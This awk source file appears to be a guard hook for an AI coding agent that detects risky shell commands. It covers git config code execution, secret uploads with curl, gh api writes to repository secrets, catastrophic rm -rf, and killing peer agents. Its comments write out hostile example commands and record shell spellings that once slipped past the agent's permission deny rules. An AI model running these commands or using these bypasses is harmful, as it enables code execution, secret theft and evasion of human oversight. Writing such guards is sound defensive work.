  if (GW_SUB == "pull" || GW_SUB == "fetch" || GW_SUB == "clone" || GW_SUB == "ls-remote") {
    for (; i <= n; i++)
      if (T[i] ~ /^--upload-pack/)
        return "names a program for git to run as the far end of a " GW_SUB ", " GW_HOW
    return ""
  }
  return ""
}

# ---- -c and --config-env behind another git-level option -------------------
#
# `git -c core.fsmonitor=/tmp/x.sh status` is arbitrary code execution, and
# `X=/tmp/x.sh git --config-env=core.fsmonitor=X status` is the same thing with
# the value read from $X.  `Bash(git --config-env*)` denies the second at every
# tier, anchored on the first token after `git` — so another git-level option in
# front (`git -P --config-env …`) walks past it exactly as it walks past the
# subcommand globs above.  Measured before this pass existed: `git --no-pager -c
# core.fsmonitor=/tmp/x.sh status` reached neither a rule nor this hook.
#
# For `--config-env`, the GITDESTRUCT design applied to an option instead of a
# subcommand: it mirrors the rule, fires only when the option comes after
# another one (git_walk's GW_CFG), and leaves the first-position spelling to the
# rule — which already matches it behind a VAR=value, since a deny rule matches
# past any leading assignment.
#
# For `-c` this pass is the whole gate, in every position, since rule set 13
# dropped `Bash(git -c *)`.  A deny rule wins over everything, and no glob can
# tell `-c core.fsmonitor=false` (which takes a program away) from `-c
# core.fsmonitor=/tmp/x.sh` (which names one), so the rule refused auditor-skill's
# safe prefix with no way to carve it out (#311).  gcfg_safe lets those two
# values through and nothing else; what follows them is still judged — by the
# `-c`-prefixed rule twins, GITDESTRUCT and the push and history gates in
# egress-guard.sh — as if the prefix were not there.  egress-guard.sh runs this
# pass ahead of its Off early-exit, so it holds at every tier as the rule did.
# Every key but those two, because the rule denied every key: which keys execute
# is GITEXEC's list, and a shorter one here would only reopen what the rule
# closed.  The walk stops at the subcommand, so a commit message or a --grep
# pattern that names either option is data and never reaches this test.
function gcfg_scan(stage,   n, T, Q, how) {
  n = tokenize(stage, T, Q); if (n == 0) return ""
  git_walk(T, n, Q)
  if (GW_OPAQUEAT == "word")
    return "lets a safe git -c value through and then hands git \"" GW_OPAQUE "\", a word the shell rewrites before git reads it (an expansion, a quote, a glob, a brace or a backslash), so what git gets cannot be checked here"
  if (GW_OPAQUEAT == "end")
    return "lets a safe git -c value through and then names no subcommand this hook can read, as when a $(…) supplies the rest"
  if (GW_CFG == "") return ""
  how = (GW_CFGHOW == "behind a git-level option" ? "behind another git-level option" : GW_CFGHOW)
  return "sets git config for this one command with " GW_CFG (how == "" ? "" : " " how) ", where a key such as core.fsmonitor, core.pager or alias.* names a program git runs"
}

# gcfg_rawscan — the part of the `-c` gate that cannot be read per stage.
# split_cmd ends a stage at `$(`, `(`, `{` and `}`, so in `git -C $(echo .) -c
# core.fsmonitor=false zz` and `git -C {.,-c,alias.zz=!cmd} zz` the git stage the
# walk sees is `git -C` alone, while bash splices the substitution's output or the
# brace's words into git's own arguments — a `-c` the walk never meets.  So on the
# raw text, split only at `;`, `&`, `|` and newlines: a piece naming git and a
# `-c` (quotes and backslashes removed, so `"-"c` and `-\c` count) that also holds
# a command or process substitution, a backtick or a brace expansion is refused.
# Coarse on purpose — `git -c core.fsmonitor=false commit -m "$(cat msg)"` is
# refused too — because what such a piece hands git is decided after this hook
# has run.
#
# Widened after the fourth review of #318 to ANY `{` or `(` outside a `${…}`
# parameter expansion and outside single quotes, plus any backtick.  Claude Code
# runs commands in the user's shell, zsh on macOS, and a stage boundary there is
# not where this hook thinks: `git {fd}>/dev/null -c 'alias.zz=!cmd' zz` (a named
# fd, bash 4.1+ and zsh), `git -C .(/) -c …` and `git -C *(/[1]) …` (zsh glob
# qualifiers) and `shopt -s extglob; git -C @(pr) -c …` all ran an injected alias,
# with the `-c` cut into a stage the walk never paired with git.  `=(` (zsh
# process substitution) is a `(` too.  `>&`, `<&`, `&>` and `>|` are redirections,
# not separators, so they are taken out before the split.
function gcfg_rawscan(s,   np, P, p, u, c) {
  gsub(/[<>]&|&>|>\|/, "R", s)
  np = split(s, P, /;|&|\||\n/)
  for (p = 1; p <= np; p++) {
    u = P[p]; gsub(/["'\\]/, "", u)
    if (u !~ /(^|[^A-Za-z0-9_.-])git([ \t]|$)/) continue
    if (u !~ /(^|[^A-Za-z0-9_-])-c/) continue
    c = P[p]; gsub(/'[^']*'/, "", c); gsub(/\$\{[^{}()]*\}/, "", c)
    if (c ~ /[{(`]/)
      return "names git and a -c, and also holds a brace, a parenthesis or a backtick (a substitution, a brace expansion, a named-fd redirection, a glob qualifier or an extended glob), whose words the shell splices into git's arguments after this hook has read them"
  }
  return ""
}

# gitcfg_main — GITCFG alone, for egress-guard.sh's run ahead of the Off
# early-exit.  The text is read as pass 0 reads it: heredoc bodies reduced to
# what runs, a code string's statements added, wrappers unwrapped.
function gitcfg_main(   ctext, cn, CS, cn0, q, cstmt, cg0, cg, CG, g, why) {
  why = gcfg_rawscan(hd_strip(kit_shell_text(raw, 0), 0))
  if (why != "") { print "GITCFG " why; exit }
  ctext = split_cmd(hd_strip(kit_shell_text(raw, 0), 0))
  cn = split(ctext, CS, /\001/)
  cn0 = cn
  cn = kit_expand_code(CS, cn)
  for (q = 1; q <= cn; q++) {
    cstmt = CS[q]
    if (cstmt !~ /[^ \t\002]/) continue
    cg0 = split(cstmt, CG, /\002/)
    cg = unwrap(CG, cg0)
    for (g = 1; g <= cg; g++) {
      GW_PAYLOAD = (q > cn0 || g > cg0)
      why = gcfg_scan(CG[g])
      if (why != "") { print "GITCFG " why; exit }
      # Behind the safe prefix the other git passes run here too, at every tier:
      # `Bash(git -c *)` used to deny all of these at Off, where the rest of this
      # hook does not run, and the literal-prefix rule twins cover one spelling.
      if (!GW_SAFE) continue
      why = gc_scan(CG[g]);  if (why != "") { print "GITEXEC " why; exit }
      why = gxp_scan(CG[g]); if (why != "") { print "GITEXECPATH " why; exit }
      why = gd_scan(CG[g]);  if (why != "") { print "GITDESTRUCT " why; exit }
    }
  }
}

# gxp_scan — `git --exec-path=<dir>` puts dir first on the path git searches for
# its helpers and its own subcommands, so the directory decides what runs: `git
# --exec-path=$d ls-remote https://…` ran $d/git-remote-https.  Denied in every
# position; a bare `--exec-path`, which only prints the path, ends git_walk first.
function gxp_scan(stage,   n, T, Q) {
  n = tokenize(stage, T, Q); if (n == 0) return ""
  git_walk(T, n, Q)
  if (GW_EXECPATH == "") return ""
  return "runs git with " unmark(GW_EXECPATH) ", which makes git run the helpers and subcommands it finds in that directory"
}

# genv_scan — git configuration set through the environment.  GIT_CONFIG_COUNT
# with GIT_CONFIG_KEY_n and GIT_CONFIG_VALUE_n, and GIT_CONFIG_PARAMETERS, which
# git passes -c through itself, are `git -c` by another name; GIT_EXEC_PATH is
# `git --exec-path=`.  Those print "GITENV", a deny at every tier.
# GIT_SSH_COMMAND, GIT_SSH, GIT_PROXY_COMMAND, GIT_EXTERNAL_DIFF and GIT_ASKPASS
# each name a program git runs too, but a deploy key's ssh command is ordinary
# work, so they print "GITENVASK" at High only.  GIT_EDITOR and GIT_PAGER are
# everyday idioms and stay open, and so does GIT_CONFIG_GLOBAL, which agents use
# to keep the user's config out (`GIT_CONFIG_GLOBAL=/dev/null`).  An assignment
# counts in front of a command, after export, declare, typeset, local or
# readonly, or among the assignments env, sudo and doas take before theirs.
# Known miss: an export the shell assembles while it runs, `eval "$(…)"` or
# `source <(…)`, is text this pass cannot read, as for the other passes here.
function genv_scan(stage,   n, T, i, c, v, soft) {
  n = tokenize(stage, T); if (n == 0) return ""
  soft = ""; i = 1
  while (i <= n && (T[i] ~ /^[A-Za-z_][A-Za-z0-9_]*\+?=/ || kit_reserved(T[i]))) {
    v = genv_name(T[i]); i++
    if (genv_hard(v)) return "GITENV " genv_why(v)
    if (genv_soft(v) && soft == "") soft = v
  }
  if (i <= n) {
    c = base(T[i]); i++
    if (c == "export" || c == "declare" || c == "typeset" || c == "local" || c == "readonly") {
      for (; i <= n; i++) {
        v = genv_name(T[i])
        if (genv_hard(v)) return "GITENV " genv_why(v)
        if (genv_soft(v) && soft == "") soft = v
      }
    } else if (c == "env" || c == "sudo" || c == "doas") {
      for (; i <= n; i++) {
        if (T[i] ~ /^-/) { if (i < n && kit_wrapper_optarg(c, T[i])) i++; continue }
        v = genv_name(T[i]); if (v == "") break
        if (genv_hard(v)) return "GITENV " genv_why(v)
        if (genv_soft(v) && soft == "") soft = v
      }
    }
  }
  if (soft != "" && MAXCLASS >= 3) return "GITENVASK sets " soft ", which names a program git runs"
  return ""
}
function genv_name(t,   v) {
  if (t !~ /^[A-Za-z_][A-Za-z0-9_]*\+?=/) return ""
  v = t; sub(/\+?=.*$/, "", v); return v
}
function genv_hard(v) {
  return (v == "GIT_CONFIG_COUNT" || v ~ /^GIT_CONFIG_(KEY|VALUE)_[0-9]+$/ \
       || v == "GIT_CONFIG_PARAMETERS" || v == "GIT_EXEC_PATH")
}
function genv_soft(v) {
  return (v == "GIT_SSH_COMMAND" || v == "GIT_SSH" || v == "GIT_PROXY_COMMAND" \
       || v == "GIT_EXTERNAL_DIFF" || v == "GIT_ASKPASS")
}
function genv_why(v) {
  if (v == "GIT_EXEC_PATH") return "sets GIT_EXEC_PATH, which is git --exec-path= by another name: git runs the helpers and subcommands it finds in that directory"
  return "sets " v " in git's environment, which is git -c by another name: a one-shot config value can make any git command run a program"
}

# pend — hold an ask until every statement has had its chance to deny.  An
# approved prompt runs the whole Bash call, so an ask printed first used to
# shadow a deny later in the same command: `curl -X POST -d @body.json …;
# curl -d @.env …` asked about the first upload and never reached the second.
function pend(v) { if (PEND == "") PEND = v }

# ---- gh api writes to the endpoints the gh subcommand denies cover (#159) ----
#
# `Bash(gh secret set *)` and `Bash(gh variable set *)` deny at every tier, but the
# REST API reaches the same endpoints, and `Bash(gh *)` is in permissions.allow:
#
#   gh api --method PUT  repos/O/R/actions/secrets/NAME -f encrypted_value=… -f key_id=…
#   gh api --method POST repos/O/R/actions/workflows/ID/dispatches -f ref=main
#
# Medium and High deny `Bash(gh api *)` outright; at Relaxed both ran with no prompt.
# A glob cannot separate them from the POST that adds a comment or a label — which
# is most of what `gh api` is for — because it sees neither the method nor the
# path as such.  This pass reads both.
#
# THE METHOD.  gh's own rule: `-X`/`--method` wins (the last one, as pflag keeps it);
# without one, any `-f`/`-F`/`--raw-field`/`--field`/`--input` makes it a POST,
# and otherwise it is a GET.  PUT, POST and PATCH are writes.  A method the hook
# cannot read — `-X "$M"`, `-X $(…)` — counts as a write, since it is only ever
# consulted for an endpoint below, where guessing GET would be the silent hole.
# DELETE is left alone: `gh secret delete` and `gh variable delete` are open at
# every tier, and removing a secret hands nothing to anyone.
#
# THE ENDPOINT.  Every positional word after `gh api` is tested — gh takes exactly
# one, so a second is a gh usage error rather than a false positive, and testing
# them all means an operand-taking flag this list lacks costs nothing.  The owner
# and repository segments are skipped by position (`repos/O/R/…`, `orgs/O/…`,
# `user/…`), so a repository NAMED `deployments` or `secrets` is not read as the
# endpoint; when one of them is an expansion (`repos/$GITHUB_REPOSITORY/…`, one
# word standing for two) the shorter skip is tried as well.  A leading slash, a
# full https URL, a GHES `api/v3/` prefix and a query string are all stripped,
# and gh's `{owner}`/`{repo}`/`{branch}` placeholders are rewritten before the
# split, because unquoted they would otherwise read as brace groups.
#
#   GHSECRET  …/actions|dependabot|codespaces/secrets|variables…, at repository,
#             organization and user level, and environments/E/secrets|variables.
#             The `gh secret set` / `gh variable set` deny, by another route.
#   GHACTION  workflow dispatches, repository_dispatch (`repos/O/R/dispatches`),
#             deployments (Pages deployments included) and environments — a run,
#             a deploy, or a change to the protection rules that gate one.
#
# Everything else stays silent at every tier: issues, pulls, comments, labels,
# reactions, releases, and any GET.  So does a commit message or an issue body
# that merely names one of these paths, since only argument position is read.
#
# KNOWN MISSES, stated: an endpoint held entirely in a variable (`gh api "$EP"`),
# a path the shell assembles after the hook has read it, `gh api graphql` (no
# secrets mutation exists there, but `createDeployment` does), and gh run from a
# script the agent wrote.  Off disables the hook, as it disables every gate.

# gha_operand — a `gh api` option that takes a value.  Missing one puts its value
# where the endpoint is looked for, which is harmless because every positional is
# tested; the cost is only that a value could look like a path.
function gha_operand(o) {
  return (o == "-X" || o == "--method" || o == "-f" || o == "--raw-field" \
       || o == "-F" || o == "--field" || o == "--input" || o == "-H" || o == "--header" \
       || o == "-p" || o == "--preview" || o == "-q" || o == "--jq" || o == "-t" \
       || o == "--template" || o == "--cache" || o == "--hostname")
}

# gha_rest — classify the endpoint from segment s on, past owner and repository.
function gha_rest(P, n, s,   a, b, c, d) {
  a = (s <= n) ? P[s] : ""; b = (s + 1 <= n) ? P[s + 1] : ""
  c = (s + 2 <= n) ? P[s + 2] : ""; d = (s + 3 <= n) ? P[s + 3] : ""
  if ((a == "actions" || a == "dependabot" || a == "codespaces") && (b == "secrets" || b == "variables"))
    return "GHSECRET"
  if (a == "environments" && (c == "secrets" || c == "variables")) return "GHSECRET"
  if (a == "dispatches" || a == "deployments" || a == "environments") return "GHACTION"
  if (a == "actions" && b == "workflows" && d == "dispatches") return "GHACTION"
  if (a == "pages" && b == "deployments") return "GHACTION"
  return ""
}

function gha_class(ep,   p, n, P, s, alt, k) {
  p = tolower(unmark(ep))
  sub(/^[a-z][a-z0-9+.-]*:\/\/[^\/]*/, "", p)   # a full URL: scheme and host
  sub(/[?#].*$/, "", p)                         # query string, fragment
  sub(/^\/+/, "", p)
  sub(/^api\/v3\//, "", p)                      # GHES
  n = split(p, P, /\/+/)
  alt = 0
  if (P[1] == "repos") { s = 4; if (P[2] ~ /\$/ || P[3] ~ /\$/) alt = 3 }
  else if (P[1] == "repositories" || P[1] == "orgs") s = 3
  else if (P[1] == "user") s = 2
  else return ""
  k = gha_rest(P, n, s)
  if (k == "" && alt) k = gha_rest(P, n, alt)
  return k
}

# ghapi_scan — one pipeline stage.  Returns "<CLASS> <reason>", or "".
function ghapi_scan(stage,   n, T, i, j, tok, o, v, has, meth, body, nep, EP, k, ch, rest) {  n = tokenize(stage, T); if (n == 0) return ""
  # Command position, then the subcommand: `echo gh api …` and a commit message
  # naming one are data, and so is `gh issue create --body "gh api …"`.
  if (cmdword_x(T, n, 1, 1) != "gh" || CWI + 1 > n || T[CWI + 1] != "api") return ""
  meth = ""; body = 0; nep = 0
  for (i = CWI + 2; i <= n; i++) {
    tok = T[i]
    if (substr(tok, 1, 2) == "--") {
      o = tok; v = ""; has = 0
      if (o ~ /=/) { v = o; sub(/^[^=]*=/, "", v); sub(/=.*$/, "", o); has = 1 }
      if (!gha_operand(o)) continue             # --paginate, --silent, --include …
      if (!has) { v = (i < n) ? T[i + 1] : ""; i++ }
      if (o == "--method") meth = v
      else if (o == "--field" || o == "--raw-field" || o == "--input") body = 1
      continue
    }
    if (substr(tok, 1, 1) == "-" && length(tok) > 1) {
      # A short cluster: booleans (-i) then at most one option that takes a value,
      # attached (-XPUT, -iXPUT) or as the next word.
      rest = substr(tok, 2)
      for (j = 1; j <= length(rest); j++) {
        ch = substr(rest, j, 1)
        if (!gha_operand("-" ch)) continue
        v = substr(rest, j + 1); sub(/^=/, "", v)
        if (v == "") { v = (i < n) ? T[i + 1] : ""; i++ }
        if (ch == "X") meth = v
        else if (ch == "f" || ch == "F") body = 1
        break
      }
      continue
    }
    EP[++nep] = tok
  }
  if (meth == "") meth = body ? "POST" : "GET"
  meth = toupper(unmark(meth))
  if (meth !~ /\$/ && meth != "PUT" && meth != "POST" && meth != "PATCH") return ""
  for (k = 1; k <= nep; k++) {
    o = gha_class(EP[k])
    if (o == "GHSECRET")
      return o " writes a repository, organization or environment secret or variable through gh api (" meth " " unmark(EP[k]) "), which is what gh secret set and gh variable set do"
    if (o == "GHACTION")
      return o " dispatches a workflow, creates a deployment or changes an environment through gh api (" meth " " unmark(EP[k]) ")"
  }
  return ""
}

# gh_placeholders — gh expands {owner}, {repo} and {branch} itself, so they reach it
# literally; split_cmd would read an unquoted one as a brace group and cut the
# endpoint in three.  ${owner} is a shell expansion and is left alone.
function gh_placeholders(s,   out, pre) {
  out = ""
  while (match(s, /\{(owner|repo|branch)\}/)) {
    pre = substr(s, 1, RSTART - 1)
    if (substr(pre, length(pre), 1) == "$") out = out pre substr(s, RSTART, RLENGTH)
    else out = out pre toupper(substr(s, RSTART + 1, RLENGTH - 2))
    s = substr(s, RSTART + RLENGTH)
  }
  return out s
}

BEGIN {
  SQ = sprintf("%c", 39)
  SECRETRE = ENVIRON["KIT_SECRET_RE"]
  KIT_CWD = ENVIRON["KIT_CWD"]; if (KIT_CWD == "") KIT_CWD = "."
  MAXCLASS = ENVIRON["KIT_MAXCLASS"] + 0
  if (MAXCLASS < 1) MAXCLASS = 1
  # The code-executing config keys, in their canonical spellings so the set a
  # reader checks against the docs is the set the code compares.  Matched
  # lowercased; `alias.*` means every variable in the section.
  GC_EXEC = "alias.* core.pager core.editor core.hooksPath sequence.editor credential.helper diff.external"
  gcn = split(GC_EXEC, GCK, " ")
  for (gci = 1; gci <= gcn; gci++) {
    GC_KEY[tolower(GCK[gci])] = 1
    gcs = tolower(GCK[gci]); sub(/\..*$/, "", gcs)
    GC_SECTION[gcs] = 1
  }
}
# ---- destructive-system pass: catastrophic `rm -rf` and process kills ---------
#
# A separate pass (KIT_RMKILL), run BEFORE egress-guard.sh's Off early-exit, so it
# holds at every tier — the one place in the hooks that classifies these, since a
# permission rule matches an `rm` target only as typed (another flag spelling, a
# variable or an expanded home passes it) and the kill rules sit at Medium+High
# (so Relaxed can kill stuck validators).  This pass is
# the every-tier floor: a catastrophic target in any spelling, `kill` of PID -1,
# and pkill/killall of a peer agent (claude/codex/orca).
#
# Targets are expanded the way the shell would: ~, $HOME and the known path vars to
# their values, in-command `VAR=value` assignments to theirs, and an unknown
# variable to EMPTY — which is the classic `rm -rf "$UNSET/sub"` -> `/sub` disaster.
# An ordinary target (./target, .next, /tmp/x, $TMPDIR/x, "$S/up-game" under a
# scratch path) is left alone; the classifier fires only when a target resolves to
# /, a first-level absolute or home child, ~, $HOME, ., .., .git, a root/home glob,
# or the project root.
function rmk_varval(name,   v) {
  if (name in RMK_ASSIGN) { v = RMK_ASSIGN[name]; if (v ~ /[$~]/) return rmk_expand(v); return v }
  if (name in ENVIRON) return ENVIRON[name]
  return ""                                          # unset: the empty-variable disaster
}
function rmk_expand(t,   out, L, i, c, j, name) {
  out = ""; L = length(t); i = 1
  if (substr(t, 1, 1) == "~" && (L == 1 || substr(t, 2, 1) == "/")) { out = RMK_HOME; i = 2 }
  while (i <= L) {
    c = substr(t, i, 1)
    if (c == "$") {
      if (substr(t, i + 1, 1) == "{") { j = index(substr(t, i), "}"); if (j == 0) { out = out c; i++; continue }
        name = substr(t, i + 2, j - 3); i = i + j }
      else { j = i + 1; name = ""; while (j <= L && substr(t, j, 1) ~ /[A-Za-z0-9_]/) { name = name substr(t, j, 1); j++ }
        if (name == "") { out = out c; i++; continue } ; i = j }
      out = out rmk_varval(name)
    } else { out = out c; i++ }
  }
  return out
}
function rm_catastrophic(x,   y) {
  if (x == "") return 0                              # empty target: rm errors, harmless
  if (x == "/*" || x == "~/*" || (RMK_HOME != "" && x == RMK_HOME "/*")) return 1   # root/home glob
  y = x; sub(/\/+$/, "", y); gsub(/^(\.\/)+/, "", y)
  if (y == "") y = (x ~ /^\//) ? "/" : "."
  if (y == "/" || y == "." || y == ".." || y == "*" || y == ".git") return 1
  if (y == "~" || (RMK_HOME != "" && y == RMK_HOME)) return 1
  if (RMK_PROJ != "" && y == RMK_PROJ) return 1
  if (RMK_CWD != "" && y == RMK_CWD) return 1
  if (y ~ /^\/[^\/]+$/) return 1                     # first-level absolute child: /x, /usr, and $UNSET/sub
  if (RMK_HOME != "" && y == RMK_HOME "/*") return 1
  return 0
}
function rm_scan(T, n,   i, rec, afterdd, a, tg) {
  rec = 0; afterdd = 0
  for (i = CWI + 1; i <= n; i++) {                   # CWI set by cmdword_x in rmkill_main
    a = T[i]
    if (!afterdd && a == "--") { afterdd = 1; continue }
    if (!afterdd && a ~ /^--recursive/) { rec = 1; continue }
    if (!afterdd && a ~ /^-[^-]*[rR]/) { rec = 1; continue }   # -r -R -rf -fr -Rf clusters
    if (!afterdd && a ~ /^-/) continue                        # other flag (-f, --force, -v, -i)
    tg = rmk_expand(a)
    if (rec && rm_catastrophic(tg)) return "removes a catastrophic target recursively: " unmark(a)
  }
  return ""
}
# kill of PID -1 (every process the user owns / the process group): the last
# operand is the target, so `kill -1 1234` (SIGHUP to 1234) is fine while
# `kill -9 -1` is not.
function kill_scan(T, n,   last) {
  last = T[n]
  if (last == "-1") return "signals process group -1 (every process you own), which is not recoverable"
  return ""
}
# pkill/killall naming a peer agent.  Killing node/vitest workers by name stays
# allowed; only claude, codex and orca (any case) are refused.
function pkill_scan(c0, T, n,   i, a) {
  for (i = CWI + 1; i <= n; i++) {
    a = unmark(T[i])
    if (a ~ /^-/ && a !~ /[A-Za-z].*claude|codex|orca/) continue   # a flag with no agent name attached
    if (a ~ /[Cc][Ll][Aa][Uu][Dd][Ee]|[Cc][Oo][Dd][Ee][Xx]|[Oo][Rr][Cc][Aa]/)
      return c0 " targets a peer agent process (claude, codex or orca) by name"
  }
  return ""
}
function rmkill_assign(ST, nst,   q, ng, G, g, n, T, i, nm) {
  for (q = 1; q <= nst; q++) {
    ng = split(ST[q], G, /\002/)
    for (g = 1; g <= ng; g++) {
      n = tokenize(G[g], T)
      for (i = 1; i <= n; i++) {
        if (T[i] !~ /^[A-Za-z_][A-Za-z0-9_]*=/) break
        nm = T[i]; sub(/=.*$/, "", nm); RMK_ASSIGN[nm] = substr(T[i], length(nm) + 2)
      }
    }
  }
}
function rmkill_main(   rtx, rnst, RST, q, ng, G, g, n, T, c0, why) {
  RMK_HOME = ENVIRON["HOME"]; RMK_CWD = ENVIRON["KIT_CWD"]; RMK_PROJ = ENVIRON["CLAUDE_PROJECT_DIR"]
  # Heredoc bodies and code strings are read the way every other pass reads them: a
  # body is a command only when something runs it (hd_strip), so a document that
  # names `rm -rf ~` stays silent while `bash <<'EOF'` around it does not, and the
  # statements of an `eval` or `sh -c` string are statements too (kit_expand_code).
  # A command nested too deep to read is refused by the other guards (KIT_DEEP).
  rtx = split_cmd(hd_strip(kit_shell_text(raw, 0), 0))
  rnst = split(rtx, RST, /\001/)
  rnst = kit_expand_code(RST, rnst)
  rmkill_assign(RST, rnst)
  for (q = 1; q <= rnst; q++) {
    ng = split(RST[q], G, /\002/)
    for (g = 1; g <= ng; g++) {
      n = tokenize(G[g], T); if (n == 0) continue
      c0 = cmdword_x(T, n, 1, 1); if (c0 == "") continue
      if (c0 == "rm") { why = rm_scan(T, n); if (why != "") { print "RM " why; exit } }
      else if (c0 == "kill") { why = kill_scan(T, n); if (why != "") { print "KILL " why; exit } }
      else if (c0 == "pkill" || c0 == "killall") { why = pkill_scan(c0, T, n); if (why != "") { print "KILL " why; exit } }
    }
  }
}

{ raw = raw $0 "\n" }
END {
  # ---- destructive-system pass (rm / kill), run before the Off early-exit.
  if (ENVIRON["KIT_RMKILL"] != "") { rmkill_main(); exit }
  # ---- GITCFG alone, also run before the Off early-exit (see gcfg_scan).
  if (ENVIRON["KIT_GITCFG"] != "") { gitcfg_main(); exit }

  # ---- the text egress-guard.sh's position-anchored publish and git patterns
  # read, instead of a verdict: continuations joined and the reserved words that
  # lead a command dropped, quotes left alone (kit_shell_text), and every heredoc
  # body reduced to what runs (hd_strip).  Copied whole, a document's line that
  # began `npm publish` asked at Relaxed and was denied above it, while a
  # backticked `npm publish` in an unquoted body, which bash runs, met nothing.
  if (ENVIRON["KIT_SHELL_TEXT"] != "") { printf "%s", hd_strip(kit_shell_text(raw, 1), 1); exit }

  # ---- heredoc BODIES: a doc that merely SHOWS a curl must never fire, and a
  # body something runs is code — fed to a shell or an interpreter, directly,
  # down a pipe or through `$(cat <<EOF)`, quoted delimiter or not.  The
  # library's hd_strip decides, as it does for onchain-guard and secrets-guard;
  # this pass once kept a body only when its delimiter was unquoted and the head's
  # first word was a shell, so `bash <<'EOF'` and `cat <<'EOF' | sh` uploaded a
  # .env past it.  An unquoted body that is data still runs its `$( … )` and
  # `` ` … ` ``, so those are kept: a `$(git config core.hooksPath …)` written into
  # a file still runs while the file is written.
  text = hd_strip(kit_shell_text(raw, 0), 0)

  gtext = split_cmd(gh_placeholders(text))
  text = split_cmd(text)
  # A regex, not "\001": the awk macOS ships splits on newline as well when the
  # separator is a one-character string, so a newline inside a quoted argument
  # (a multi-line commit message) became a statement boundary there and nowhere
  # else, and a body line reading `then git config core.hooksPath x` a command.
  # A shell's -c string adds its own statements after them (kit_expand_code).
  nst = split(text, ST, /\001/)
  NST0 = nst
  nst = kit_expand_code(ST, nst)
  # Too deeply nested to read in time: refuse rather than let a publish, force push
  # or secret upload hide in the unread inner code.  egress-guard.sh denies KITDEEP.
  if (KIT_DEEP) { print "KITDEEP the command nests shell code too deeply to read"; exit }

  # ---- pass 0, over EVERY statement before any other pass reaches a verdict:
  # the three git denies — a config write that arms an execution for later, a
  # config option behind another option, a destructive subcommand behind one.
  # Ahead of the egress passes on purpose — those exit on their first match, so
  # a `curl` in an earlier statement that only ASKs would otherwise shadow a deny
  # here, and an approved prompt runs the whole Bash call, this git call included.
  for (q = 1; q <= nst; q++) {
    stmt = ST[q]
    if (stmt !~ /[^ \t\002]/) continue
    nstg0 = split(stmt, STG, /\002/)
    nstg = unwrap(STG, nstg0)
    for (g = 1; g <= nstg; g++) {
      # A shell's -c string or an unwrapped payload is a command no rule reads.
      GW_PAYLOAD = (q > NST0 || g > nstg0)
      why = gc_scan(STG[g])
      if (why != "") { print "GITEXEC " why; exit }
      why = gcfg_scan(STG[g])
      if (why != "") { print "GITCFG " why; exit }
      why = gxp_scan(STG[g])
      if (why != "") { print "GITEXECPATH " why; exit }
      why = gd_scan(STG[g])
      if (why != "") { print "GITDESTRUCT " why; exit }
      why = genv_scan(STG[g])
      if (why ~ /^GITENV /) { print why; exit }
      if (why != "") pend(why)
    }
  }
  GW_PAYLOAD = 0
  # The gh api pass, in pass 0 for the same reason, over its own split of the text:
  # the one with gh's {owner}/{repo}/{branch} placeholders rewritten.  A code
  # string's statements join it, as they join ST: `sh -c 'true; gh api …'` read
  # only its first command.
  ngst = split(gtext, GST, "\001")
  ngst = kit_expand_code(GST, ngst)
  for (q = 1; q <= ngst; q++) {
    stmt = GST[q]
    if (stmt !~ /[^ \t\002]/) continue
    nstg = split(stmt, STG, "\002")
    ngstg = unwrap(STG, nstg)
    for (g = 1; g <= ngstg; g++) {
      why = ghapi_scan(STG[g])
      # GHACTION denies from Medium up and asks at Relaxed, where it waits.
      if (why ~ /^GHACTION / && MAXCLASS < 2) pend(why)
      else if (why != "") { print why; exit }
    }
  }

  for (q = 1; q <= nst; q++) {
    stmt = ST[q]
    if (stmt !~ /[^ \t\002]/) continue
    nstg = split(stmt, STG, /\002/)

    # unwrap one level of `sh -c "<inner>"` / eval: the inner string is code
    nstg = unwrap(STG, nstg)

    # ---- pass 1: a secret reaching a network command
    leak = ""; sender = 0
    for (g = 1; g <= nstg; g++) {
      n = tokenize(STG[g], T); if (n == 0) continue
      c0 = cmdword(T, n); if (c0 == "") continue
      ci = CWI
      if (is_netsink(c0)) sender = 1

      if (is_reader(c0)) {
        for (i = ci + 1; i <= n; i++) {
          if (T[i] ~ /^-/) continue
          if (arg_is_secret(T[i])) { leak = T[i]; break }
        }
      }
      if (is_netcmd(c0)) {
        for (i = ci + 1; i <= n; i++) {
          a = T[i]
          if (a ~ /^-/ && a !~ /[@=]/) continue
          if (arg_is_secret(a)) { print "DENY secret path \"" unmark(a) "\" is an argument to network command " c0; exit }
          if (is_interp(c0)) {
            if (code_has_net(a)) sender = 1
            if ((t = code_has_secret(a)) != "") { print "DENY inline " c0 " code names a secret path: " t; exit }
          }
        }
      }
      if (match(STG[g], /<[ \t]*[^ \t<][^ \t]*/)) {
        a = substr(STG[g], RSTART, RLENGTH); sub(/^<[ \t]*/, "", a)
        if (arg_is_secret(a)) leak = a
      }
    }
    if (sender && leak != "") { print "DENY a secret file (" unmark(leak) ") is read into a network command in the same statement"; exit }

    # ---- pass 2: curl/wget flag analysis
    for (g = 1; g <= nstg; g++) {
      n = tokenize(STG[g], T); if (n == 0) continue
      if (!is_sender(cmdword(T, n))) continue     # <- prose can never reach here
      ci = CWI

      body = 0; inline = 0; src = ""; secret = ""; expand = 0; dest = ""
      for (i = ci + 1; i <= n; i++) {
        tok = T[i]; name = ""; val = ""; have = 0

        if (tok ~ /^--[A-Za-z]/) {
          name = tok; sub(/^--/, "", name)
          if (name ~ /=/) { val = name; sub(/^[^=]*=/, "", val); sub(/=.*$/, "", name); have = 1 }
          else if (i < n) { val = T[i+1]; have = 1 }
        } else if (tok ~ /^-[A-Za-z]/) {
          rest = tok; sub(/^-/, "", rest); j = 1
          while (j <= length(rest)) {
            ch = substr(rest, j, 1)
            if (cls(ch) != "") { name = ch; val = substr(rest, j + 1); if (val == "" && i < n) val = T[i+1]; have = 1; break }
            if (ch !~ /[A-Za-z]/) break
            j++
          }
        }

        if (have && (c = cls(name)) != "") {
          if (c == "FILE") {
            body = 1; f = val; sub(/^@/, "", f)
            if (f == "-") src = "stdin"
            else { if (src == "") src = f; if (arg_is_secret(f)) secret = f }
          } else if (c == "DATA") {
            body = 1
            if (val ~ /^@/ || val ~ /=@/ || val ~ /=</) {
              f = val; sub(/^.*[@<]/, "", f)
              if (f == "-") src = "stdin"
              else { if (src == "") src = f; if (arg_is_secret(f)) secret = f }
            } else inline = 1
            if (val ~ /\$/) expand = 1
          } else if (c == "LIT") {
            body = 1; inline = 1
            if (val ~ /\$/) expand = 1
          } else if (c == "HDR") {
            if (val ~ /^@/) {
              body = 1; f = val; sub(/^@/, "", f)
              if (f == "-") src = "stdin"
              else { if (src == "") src = f; if (arg_is_secret(f)) secret = f }
